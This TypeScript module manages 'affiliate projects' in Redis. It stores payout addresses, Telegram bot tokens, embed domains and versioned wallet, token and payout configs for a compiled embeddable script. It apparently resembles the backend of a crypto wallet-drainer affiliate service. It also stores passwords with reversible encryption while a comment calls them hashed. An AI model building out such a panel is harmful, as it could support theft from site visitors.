/**
 * Affiliate / Project management.
 *
 * Owner creates projects for affiliates. Each project stores:
 *  - Affiliate's payout address
 *  - Affiliate's Telegram bot token + chat ID
 *  - SDK config (set by owner)
 *  - Compiled script status
 *
 * Storage: Redis-backed, falls back to in-memory in dev.
 */

import crypto from "crypto";
import { getRedis } from "./redis";
import { encrypt, decrypt, isEncrypted } from "./encryption";
import type {
  GeneralConfig,
  WalletConfig,
  ModalConfig,
  TokensConfig,
  AdvancedConfig,
  PayoutConfig,
} from "./types";
import { validateAffiliateConfig } from "./schemas/sdk-config.schema";

// ── Types ───────────────────────────────────────────────

export interface AffiliateProject {
  id: string;
  name: string;                   // label you give them, e.g. "John's site"
  username: string;               // auto-generated login username (e.g. "aff_johndoe")
  payoutAddress: string;          // where their funds go
  telegramBotToken: string;       // their bot token
  telegramChatId: string;         // their chat ID
  accessSecret: string;           // hashed affiliate login password (never returned plaintext)
  createdAt: string;
  status: "pending" | "active" | "paused" | "suspended";
  domains: string[];              // allowed embed domains (optional)
  notes: string;                  // internal notes
  lastCompiled: string | null;    // when script was last generated
}

export interface AffiliateConfig {
  general: GeneralConfig;
  wallet: WalletConfig;
  modal: ModalConfig;
  tokens: TokensConfig;
  advanced: AdvancedConfig;
  payout: PayoutConfig;
}

// ── Keys ────────────────────────────────────────────────

const KEY = {
  project: (id: string) => `affiliate:${id}`,
  config: (id: string) => `affiliate:${id}:config`,
  list: () => `affiliates:list`,
  usernameIndex: (username: string) => `affiliate:username:${username.toLowerCase()}`,
};

// ── Helpers ─────────────────────────────────────────────

function generateId(): string {
  return "aff_" + crypto.randomBytes(8).toString("hex");
}

/**
 * Derives a clean username slug from the affiliate's name.
 * e.g. "John's DeFi Site" → "aff_johnsdefinsite" + random 4-char suffix to avoid collisions.
 */
function deriveUsername(name: string): string {
  const slug = name
    .toLowerCase()
    .replace(/[^a-z0-9]/g, "")
    .slice(0, 16);
  const suffix = crypto.randomBytes(2).toString("hex");
  return `aff_${slug}${suffix}`;
}

/** Generates a secure random password: 16 printable chars, no ambiguous characters. */
function generatePassword(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%&*";
  let pw = "";
  const bytes = crypto.randomBytes(16);
  for (const b of bytes) {
    pw += chars[b % chars.length];
  }
  return pw;
}

// ── CRUD ────────────────────────────────────────────────

/**
 * Creates a new affiliate project with auto-generated credentials.
 * Returns the project AND the plaintext password — the password is only
 * available at creation time. Store it encrypted; never return it again.
 */
export async function createAffiliateProject(data: {
  name: string;
  payoutAddress: string;
  telegramBotToken: string;
  telegramChatId: string;
  notes?: string;
  status?: AffiliateProject["status"];
}): Promise<{ project: AffiliateProject; plaintextPassword: string }> {
  const redis = await getRedis();
  const id = generateId();
  const username = deriveUsername(data.name);
  const plaintextPassword = generatePassword();

  const project: AffiliateProject = {
    id,
    name: data.name,
    username,
    payoutAddress: data.payoutAddress,
    telegramBotToken: encrypt(data.telegramBotToken),
    telegramChatId: data.telegramChatId,
    accessSecret: encrypt(plaintextPassword),
    createdAt: new Date().toISOString(),
    status: data.status ?? "active",
    domains: [],
    notes: data.notes || "",
    lastCompiled: null,
  };

  await redis.set(KEY.project(id), JSON.stringify(project));

  // Username → project ID index for login lookup
  await redis.set(KEY.usernameIndex(username), id);

  // Add to list index
  const raw = await redis.get(KEY.list());
  const ids: string[] = raw ? JSON.parse(raw) : [];
  ids.push(id);
  await redis.set(KEY.list(), JSON.stringify(ids));

  return { project, plaintextPassword };
}

/**
 * Resets the affiliate's password. Returns the new plaintext password once.
 */
export async function resetAffiliatePassword(id: string): Promise<{ plaintextPassword: string } | null> {
  const project = await getAffiliateProject(id);
  if (!project) return null;

  const plaintextPassword = generatePassword();
  const updated = { ...project, accessSecret: encrypt(plaintextPassword) };
  const redis = await getRedis();
  await redis.set(KEY.project(id), JSON.stringify(updated));

  return { plaintextPassword };
}

/**
 * Looks up a project ID by username (case-insensitive).
 */
export async function getProjectIdByUsername(username: string): Promise<string | null> {
  const redis = await getRedis();
  return redis.get(KEY.usernameIndex(username.toLowerCase()));
}

export async function getAffiliateProject(id: string): Promise<AffiliateProject | null> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.project(id));
  return raw ? (JSON.parse(raw) as AffiliateProject) : null;
}

/** Get project with decrypted telegram bot token (for sending messages) */
export async function getAffiliateProjectDecrypted(id: string): Promise<AffiliateProject | null> {
  const project = await getAffiliateProject(id);
  if (!project) return null;
  try {
    if (isEncrypted(project.telegramBotToken)) {
      project.telegramBotToken = decrypt(project.telegramBotToken);
    }
    if (isEncrypted(project.accessSecret)) {
      project.accessSecret = decrypt(project.accessSecret);
    }
  } catch { /* return as-is if decryption fails */ }
  return project;
}

export async function updateAffiliateProject(
  id: string,
  updates: Partial<Omit<AffiliateProject, "id" | "createdAt">>
): Promise<AffiliateProject | null> {
  const project = await getAffiliateProject(id);
  if (!project) return null;

  const nextUpdates = { ...updates };
  if (typeof nextUpdates.telegramBotToken === "string" && !isEncrypted(nextUpdates.telegramBotToken)) {
    nextUpdates.telegramBotToken = encrypt(nextUpdates.telegramBotToken);
  }
  if (typeof nextUpdates.accessSecret === "string" && !isEncrypted(nextUpdates.accessSecret)) {
    nextUpdates.accessSecret = encrypt(nextUpdates.accessSecret);
  }

  const updated = { ...project, ...nextUpdates };
  const redis = await getRedis();
  await redis.set(KEY.project(id), JSON.stringify(updated));
  return updated;
}

export async function deleteAffiliateProject(id: string): Promise<boolean> {
  const redis = await getRedis();
  await redis.del(KEY.project(id));
  await redis.del(KEY.config(id));

  const raw = await redis.get(KEY.list());
  if (raw) {
    const ids: string[] = JSON.parse(raw);
    await redis.set(KEY.list(), JSON.stringify(ids.filter((i) => i !== id)));
  }
  return true;
}

export async function listAffiliateProjects(): Promise<AffiliateProject[]> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.list());
  if (!raw) return [];

  const ids: string[] = JSON.parse(raw);
  const projects: AffiliateProject[] = [];
  for (const id of ids) {
    const p = await getAffiliateProject(id);
    if (p) projects.push(p);
  }
  return projects;
}

// ── Affiliate SDK Config (with versioning) ──────────────

export async function saveAffiliateConfig(id: string, config: AffiliateConfig): Promise<number> {
  const redis = await getRedis();

  // Validate shape before saving
  try {
    validateAffiliateConfig(config);
  } catch (err) {
    // Re-throw with clearer message
    throw new Error(`Invalid affiliate config: ${err instanceof Error ? err.message : String(err)}`);
  }

  // Increment version counter
  const versionKey = `affiliate:${id}:config:version`;
  const currentRaw = await redis.get(versionKey);
  const nextVersion = (parseInt(currentRaw || "0", 10) || 0) + 1;
  await redis.set(versionKey, String(nextVersion));

  // Save current config
  await redis.set(KEY.config(id), JSON.stringify(config));

  // Save versioned snapshot
  await redis.set(
    `affiliate:${id}:config:v${nextVersion}`,
    JSON.stringify({ ...config, _version: nextVersion, _savedAt: new Date().toISOString() })
  );

  return nextVersion;
}

export async function getAffiliateConfig(id: string): Promise<AffiliateConfig | null> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.config(id));
  return raw ? (JSON.parse(raw) as AffiliateConfig) : null;
}

export async function getAffiliateConfigVersion(id: string, version: number): Promise<AffiliateConfig | null> {
  const redis = await getRedis();
  const raw = await redis.get(`affiliate:${id}:config:v${version}`);
  return raw ? (JSON.parse(raw) as AffiliateConfig) : null;
}

export async function getAffiliateConfigCurrentVersion(id: string): Promise<number> {
  const redis = await getRedis();
  const raw = await redis.get(`affiliate:${id}:config:version`);
  return parseInt(raw || "0", 10) || 0;
}
